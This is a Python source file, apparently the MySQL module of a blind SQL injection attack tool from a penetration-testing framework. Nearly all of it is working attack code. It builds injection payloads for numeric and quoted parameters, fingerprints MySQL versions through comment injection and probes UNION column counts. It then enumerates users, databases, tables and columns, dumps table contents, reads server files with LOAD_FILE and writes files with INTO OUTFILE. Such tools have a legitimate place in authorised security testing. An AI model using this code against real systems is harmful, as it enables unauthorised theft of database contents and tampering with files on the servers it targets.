import random
import re
import time

from plugins.attack.db.dbDriver import dbDriver as Common


class MySQLMap(Common):
    __banner                 = ""
    __currentDb           = ""
    __fingerprint           = []
    __cachedDbs           = []
    __cachedTables         = {}
    __cachedColumns       = {}
    __has_information_schema = False


    def unescape(self, expression):
        while True:
            index = expression.find("'")
            if index == -1:
                break

            firstIndex = index + 1
            index = expression[firstIndex:].find("'")

            if index == -1:
                raise Exception, "Unenclosed ' in '%s'" % expression

            lastIndex = firstIndex + index
            old = "'%s'" % expression[firstIndex:lastIndex]
            unescaped = ""

            for i in range(firstIndex, lastIndex):
                unescaped += "%d" % (ord(expression[i]))
                if i < lastIndex - 1:
                    unescaped += ","

            expression = expression.replace(old, "CHAR(%s)" % unescaped)

        return expression

    def unescape_string(self, a_string):
        ord_list = []
        
        for char in a_string:
            ord_list.append( str(ord(char)) )

        return 'CHAR(' + ','.join(ord_list) + ')'

    def createStm(self):
        if self.args.injectionMethod == "numeric":
            evilStm = " OR ORD(MID((%s), %d, %d)) > %d"
        elif self.args.injectionMethod == "stringsingle":
            evilStm = "' OR ORD(MID((%s), %d, %d)) > %d AND '1"
        elif self.args.injectionMethod == "stringdouble":
            evilStm = '" OR ORD(MID((%s), %d, %d)) > %d AND "1'
        return evilStm
        
    def createExactStm(self):
        if self.args.injectionMethod == "numeric":
            evilStm = " OR MID((%s), %d, %d) = '%s' AND 1=1"
        elif self.args.injectionMethod == "stringsingle":
            evilStm = "' OR MID((%s), %d, %d) = '%s' AND '1"
        elif self.args.injectionMethod == "stringdouble":
            evilStm = '" OR MID((%s), %d, %d) = "%s" AND "1'

        return evilStm

    def __commentCheck(self):
        logMsg = "executing MySQL comment injection fingerprint"
        self.log(logMsg)

        if self.args.injectionMethod == "numeric":
            stm = " /* NoValue */"
        elif self.args.injectionMethod == "stringsingle":
            stm = "' /* NoValue */ AND '1"
        elif self.args.injectionMethod == "stringdouble":
            stm = '" /* NoValue */ AND "1'

        baseUrl = self.urlReplace(newValue=stm)
        newResult = self.queryPage(baseUrl)

        if newResult != self.args.trueResult:
            warnMsg = "unable to perform MySQL comment injection"
            self.warn(warnMsg)

            return None

        # MySQL valid versions updated at 02/2007
        versions = (
                     (32200, 32233),    # MySQL 3.22
                     (32300, 32354),    # MySQL 3.23
                     (40000, 40024),    # MySQL 4.0
                     (40100, 40122),    # MySQL 4.1
                     (50000, 50032),    # MySQL 5.0
                     (50100, 50114),    # MySQL 5.1
                    )

        for element in versions:
            for version in range(element[0], element[1] + 1):
                version = str(version)

                if self.args.injectionMethod == "numeric":
                    stm = " /*!%s AND 1=2*/" % version
                elif self.args.injectionMethod == "stringsingle":
                    stm = "' /*!%s AND 1=2*/ AND '1" % version
                elif self.args.injectionMethod == "stringdouble":
                    stm = '" /*!%s AND 1=2*/ AND "1' % version

                baseUrl = self.urlReplace(newValue=stm)
                newResult = self.queryPage(baseUrl)

                if newResult == self.args.trueResult:
                    if version[0] == "3":
                        midVer = prevVer[1:3]
                    else:
                        midVer = prevVer[2]
                    trueVer = "%s.%s.%s" % (prevVer[0], midVer, prevVer[3:])

                    return trueVer

                prevVer = version

        return None


    def getFingerprint(self):
        actVer = self.parseFp("MySQL", self.__fingerprint)

        if not self.args.exaustiveFp:
            return actVer

        blank = " " * 16
        value = "active fingerprint: %s" % actVer

        comVer = self.__commentCheck()
        if comVer:
            comVer = self.parseFp("MySQL", [comVer])
            value += "\n%scomment injection fingerprint: %s" % (blank, comVer)

        if self.__banner:
            banVer = re.search("^([\d\.]+)", self.__banner)
            banVer = banVer.groups()[0]

            if re.search("-log$", self.__banner):
                banVer += ", logging enabled"

            banVer = self.parseFp("MySQL", [banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        return value


    def getBanner(self):
        logMsg = "fetching banner"
        self.log(logMsg)

        if not self.__banner:
            self.__banner = self.getValue("VERSION()")

        return self.__banner


    def getCurrentUser(self):
        logMsg = "fetching current user"
        self.log(logMsg)

        return self.getValue("current_user()")


    def getCurrentDb(self):
        logMsg = "fetching current database"
        self.log(logMsg)

        if self.__currentDb:
            return self.__currentDb
        else:
            return self.getValue("database()")


    def getUsers(self):
        logMsg = "fetching number of database users"
        self.log(logMsg)

        stm = "SELECT COUNT(DISTINCT(user)) FROM mysql.user"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg = "unable to retrieve the number of database users"
            raise Exception, errMsg

        logMsg = "fetching database users"
        self.log(logMsg)

        users = []

        for index in range(int(count)):
            stm  = "SELECT DISTINCT(user) "
            stm += "FROM mysql.user LIMIT %d, 1" % index

            user = self.getValue(stm)
            users.append(user)

        if not users:
            errMsg = "unable to retrieve the database users"
            raise Exception, errMsg

        return users


    def getDbs(self):
        logMsg = "fetching number of databases"
        self.log(logMsg)

        if not self.__has_information_schema:
            warnMsg  = "information_schema not available, "
            warnMsg += "remote database is MySQL < 5. database "
            warnMsg += "names will be fetched from 'mysql' table"
            self.warn(warnMsg)

            stm = "SELECT COUNT(DISTINCT(db)) FROM mysql.db"
        else:
            stm  = "SELECT COUNT(DISTINCT(schema_name)) "
            stm += "FROM information_schema.schemata"

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg = "unable to retrieve the number of databases"
            raise Exception, errMsg

        logMsg = "fetching database names"
        self.log(logMsg)

        dbs = []

        for index in range(int(count)):
            if not self.__has_information_schema:
                stm  = "SELECT DISTINCT(db) "
                stm += "FROM mysql.db LIMIT %d, 1" % index
            else:
                stm  = "SELECT DISTINCT(schema_name) "
                stm += "FROM information_schema.schemata "
                stm += "LIMIT %d, 1" % index

            db = self.getValue(stm)
            dbs.append(db)

        if dbs:
            self.__cachedDbs = dbs
        else:
            errMsg = "unable to retrieve the database names"
            raise Exception, errMsg

        return dbs


    def getTables(self):
        if not self.__has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "remote database is MySQL < 5.0"
            raise Exception, errMsg

        if not self.args.db:
            if not len(self.__cachedDbs):
                dbs = self.getDbs()
            else:
                dbs = self.__cachedDbs
        else:
            if "," in self.args.db:
                dbs = self.args.db.split(",")
            else:
                dbs = [self.args.db]

        dbTables = {}

        for db in dbs:
            logMsg = "fetching number of tables for database '%s'" % db
            self.log(logMsg)

            stm  = "SELECT COUNT(DISTINCT(table_name)) "
            stm += "FROM information_schema.tables "
            stm += "WHERE table_schema LIKE '%s'" % db

            count = self.getValue(stm)

            if not len(count) or count == "0":
                warnMsg  = "unable to retrieve the number of "
                warnMsg += "tables for database '%s'" % db
                self.warn(warnMsg)

                continue

            logMsg = "fetching tables for database '%s'" % db
            self.log(logMsg)

            tables = []

            for index in range(int(count)):
                stm  = "SELECT DISTINCT(table_name) "
                stm += "FROM information_schema.tables "
                stm += "WHERE table_schema LIKE '%s' " % db
                stm += "LIMIT %d, 1" % index

                table = self.getValue(stm)
                tables.append(table)

            if tables:
                dbTables[db] = tables
            else:
                warnMsg  = "unable to retrieve the tables "
                warnMsg += "for database '%s'" % db
                self.warn(warnMsg)

        if dbTables:
            self.__cachedTables = dbTables
        elif not self.args.db:
            errMsg  = "unable to retrieve the tables for any database"
            raise Exception, errMsg

        return dbTables


    def getColumns(self):
        if not self.args.tbl:
            errMsg = "missing table parameter"
            raise Exception, errMsg

        if not self.__has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "remote database is MySQL < 5.0"
            raise Exception, errMsg

        if "." in self.args.tbl:
            self.args.db, self.args.tbl = self.args.tbl.split(".")

        logMsg = "fetching number of columns for table '%s'" % self.args.tbl
        if self.args.db:
            logMsg += " on database '%s'" % self.args.db
        self.log(logMsg)

        stm  = "SELECT COUNT(DISTINCT(column_name)) "
        stm += "FROM information_schema.columns "
        stm += "WHERE table_name LIKE '%s' " % self.args.tbl
        if self.args.db:
            stm += "AND table_schema LIKE '%s'" % self.args.db

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of columns "
            errMsg += "for table '%s'" % self.args.tbl
            if self.args.db:
                errMsg += " on database '%s'" % self.args.db
            raise Exception, errMsg

        logMsg = "fetching columns for table '%s'" % self.args.tbl
        if self.args.db:
            logMsg += " on database '%s'" % self.args.db
        self.log(logMsg)

        tableColumns = {}
        table = {}
        columns = {}

        for index in range(int(count)):
            stm  = "SELECT DISTINCT(column_name) "
            stm += "FROM information_schema.columns "
            stm += "WHERE table_name LIKE '%s' " % self.args.tbl
            if self.args.db:
                stm += "AND table_schema LIKE '%s' " % self.args.db
            stm += "LIMIT %d, 1" % index

            column = self.getValue(stm)

            stm  = "SELECT data_type "
            stm += "FROM information_schema.columns "
            stm += "WHERE table_name LIKE '%s' " % self.args.tbl
            stm += "AND column_name LIKE '%s'" % column
            if self.args.db:
                stm += " AND table_schema LIKE '%s'" % self.args.db

            coltype = self.getValue(stm)
            columns[column] = coltype

        if columns:
            table[self.args.tbl] = columns
            tableColumns[self.args.db] = table
        else:
            errMsg  = "unable to retrieve the columns for "
            errMsg += "table '%s'" % self.args.tbl
            if self.args.db:
                errMsg += " on database '%s'" % self.args.db
            raise Exception, errMsg

        self.__cachedColumns[self.args.db] = table

        return tableColumns


    def dumpTable(self):
        if not self.args.tbl:
            raise Exception, "missing table parameter"

        if not self.__has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "remote database is MySQL < 5.0"
            raise Exception, errMsg

        if not self.__cachedColumns:
            self.__cachedColumns = self.getColumns()

        logMsg  = "fetching number of entries for "
        logMsg += "table '%s'" % self.args.tbl
        if self.args.db:
            logMsg += "on database '%s'" % self.args.db
            fromExpr = "%s.%s" % (self.args.db, self.args.tbl)
        else:
            fromExpr = self.args.tbl

        columnValues = {}
        stm = "SELECT COUNT(*) FROM %s" % fromExpr

        count = self.getValue(stm)

        if not len(count) or count == "0":
            errMsg  = "unable to retrieve the number of entries "
            errMsg += "for table '%s'" % self.args.tbl
            if self.args.db:
                errMsg += " on database '%s'" % self.args.db
            raise Exception, errMsg

        if self.args.col:
            self.args.col = self.args.col.split(',')

        columns = self.__cachedColumns[self.args.db][self.args.tbl]

        for column in columns.keys():
            if self.args.col and column not in self.args.col:
                continue

            logMsg  = "fetching entries of column '%s' for " % column
            logMsg += "table '%s'" % self.args.tbl
            if self.args.db:
                logMsg += " on database '%s'" % self.args.db
            self.log(logMsg)

            length = 0
            values = []
            columnData = {}
            columnValues[column] = {}

            for index in range(int(count)):
                stm  = "SELECT %s FROM %s " % (column, fromExpr)
                stm += "LIMIT %d, 1" % index
                value = self.getValue(stm)

                length = max(length, len(str(value)))
                values.append(value)

            if length < len(column):
                columnData["length"] = len(column)
            else:
                columnData["length"] = length

            columnData["values"] = values
            columnValues[column] = columnData

        if columnValues:
            infos = {}

            if self.args.db:
                infos["db"] = self.args.db
            else:
                infos["db"] = None
            infos["table"] = self.args.tbl
            infos["count"] = count

            columnValues["__infos__"] = infos
        else:
            errMsg  = "unable to retrieve the entries for "
            errMsg += "table '%s'" % self.args.tbl
            if self.args.db:
                errMsg += " on database '%s'" % self.args.db
            raise Exception, errMsg

        return columnValues


    def getFile(self, filename):
        logMsg = "fetching file: '%s'" % filename
        self.log(logMsg)

        if self.args.unionUse:
            return self.unionUse("SELECT LOAD_FILE('%s')" % filename)
        else:
            return self.getValue("SELECT LOAD_FILE('%s')" % filename)

    def writeFile( self, filename, content ):
        self.log('Writing %s with content: %s' % (filename,content) )
        
        union = self.unionCheck()
        # union = http://localhost/w3af/blindSqli/blindSqli-integer.php?id=1 UNION SELECT NULL, NULL, NULL, NULL, NULL
        if union is None:
            raise Exception('Failed to find a valid SQL UNION.')
        
        if self.args.injectionMethod == "numeric":
            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
        elif self.args.injectionMethod == "stringsingle":
            union = union.replace( "'1", 'NULL', 1 )
            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
        elif self.args.injectionMethod == "stringdouble":
            union = union.replace( '"1', 'NULL', 1 )
            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE "%s" %%23' % filename
        
        # Now I'll basically create a list of union statements that are going to be sent to the
        # remote server. I create a list, because I REALLY WANT TO WRITE THE FILE, but I
        # don't know which of the "NULLs" that I'm injecting will be correctly casted to the
        # result that "the programmer" is injecting in the left side of the SELECT
        union_list = []
        number_of_nulls = union.count('NULL')
        union = union.replace('NULL', '%s')
        
        format_string_data = [ 'NULL' for i in xrange(number_of_nulls) ]
        
        # Do some content mangling... and convert to CHAR(....)
        content = self.unescape_string( content )
        
        for position in xrange(number_of_nulls):
            tmp_format_string_data = format_string_data[:]
            tmp_format_string_data[position] = content
            
            crafted_union = union
            for string_format in xrange(union.count('%s')):
                crafted_union = crafted_union.replace('%s', tmp_format_string_data[string_format], 1)
            union_list.append( crafted_union )

        for union in union_list:
            self.log( 'Using UNION: ' + union )
            self.getPage( union )
        
    def getExpr(self, expression):
        if self.args.unionUse:
            return self.unionUse(expression)
        else:
            return self.getValue(expression)


    def checkDbms(self):
        logMsg = "testing MySQL"
        self.log(logMsg)

        randInt = str(random.randint(1, 9))
        stm = "CONCAT('%s', '%s')" % (randInt, randInt)

        if self.getValue(stm) == (randInt * 2):
            logMsg = "confirming MySQL"
            self.log(logMsg)

            stm = "LENGTH('%s')" % randInt

            if not self.getValue(stm) == "1":
                warnMsg = "remote database is not MySQL"
                self.warn(warnMsg)

                return False

            stm  = "SELECT %s " % randInt
            stm += "FROM information_schema.tables "
            stm += "LIMIT 0, 1"

            if self.getValue(stm) == randInt:
                self.__has_information_schema = True

                if not self.args.exaustiveFp:
                    self.__fingerprint = [">= 5.0.0"]
                    return True

                self.__currentDb = self.getValue("DATABASE()")
                if self.__currentDb == self.getValue("SCHEMA()"):
                    self.__fingerprint = [">= 5.0.2", "< 5.1"]

                    stm  = "SELECT %s " % randInt
                    stm += "FROM information_schema.partitions "
                    stm += "LIMIT 0, 1"

                    if self.getValue(stm) == randInt:
                        self.__fingerprint = [">= 5.1"]
                else:
                    self.__fingerprint = ["= 5.0.0 or 5.0.1"]
            else:
                self.__fingerprint = ["< 5.0.0"]

                if not self.args.exaustiveFp:
                    return True

                coercibility = self.getValue("COERCIBILITY(USER())")
                if coercibility == "3":
                    self.__fingerprint = [">= 4.1.11", "< 5.0.0"]
                elif coercibility == "2":
                    self.__fingerprint = [">= 4.1.1", "< 4.1.11"]
                elif self.getValue("CURRENT_USER()"):
                    self.__fingerprint = [">= 4.0.6", "< 4.1.1"]

                    if self.getValue("CHARSET(CURRENT_USER())") == "utf8":
                        self.__fingerprint = ["= 4.1.0"]
                    else:
                        self.__fingerprint = [">= 4.0.6", "< 4.1.0"]
                elif self.getValue("FOUND_ROWS()") == "0":
                    self.__fingerprint = [">= 4.0.0", "< 4.0.6"]
                elif self.getValue("CONNECTION_ID()"):
                    self.__fingerprint = [">= 3.23.14", "< 4.0.0"]
                elif re.search("@[\w\.\-\_]+", self.getValue("USER()")):
                    self.__fingerprint = [">= 3.22.11", "< 3.23.14"]
                else:
                    self.__fingerprint = ["< 3.22.11"]

            if self.args.getBanner:
                self.__banner = self.getValue("VERSION()")

            return True
        else:
            warnMsg = "remote database is not MySQL"
            self.warn(warnMsg)

            return False

    def unionCheck(self):
        logMsg = "testing union on parameter '%s'" % self.args.injParameter
        self.log(logMsg)

        resultDict = {}

        if self.args.injectionMethod == "numeric":
            stm = " UNION SELECT NULL"
        elif self.args.injectionMethod == "stringsingle":
            stm = "' UNION SELECT NULL"
        elif self.args.injectionMethod == "stringdouble":
            stm = '" UNION SELECT NULL'

        for i in range(100):
            if self.args.injectionMethod == "numeric":
                checkStm = stm
            elif self.args.injectionMethod == "stringsingle":
                checkStm = stm + ", '1"
            elif self.args.injectionMethod == "stringdouble":
                checkStm = stm + ', "1'

            baseUrl = self.urlReplace(newValue=checkStm)
            newResult = self.queryPage(baseUrl)

            if not newResult in resultDict.keys():
                resultDict[newResult] = (1, stm)
            else:
                resultDict[newResult] = (resultDict[newResult][0] + 1, stm)

            stm += ", NULL"

            if i > 2:
                for element in resultDict.values():
                    if element[0] == 1:
                        
                        if self.args.httpMethod == "GET":
                            value = baseUrl
                            return value
                        
                        elif self.args.httpMethod == "POST":
                            url = baseUrl.split("?")[0]
                            data = baseUrl.split("?")[1]
                            value = "url:\t'%s'" % url
                            value += "\ndata:\t'%s'\n" % data
                            return value
    
    def __init__(self, urlOpener, cmpFunction, vuln):
        Common.__init__( self, urlOpener, cmpFunction, vuln )

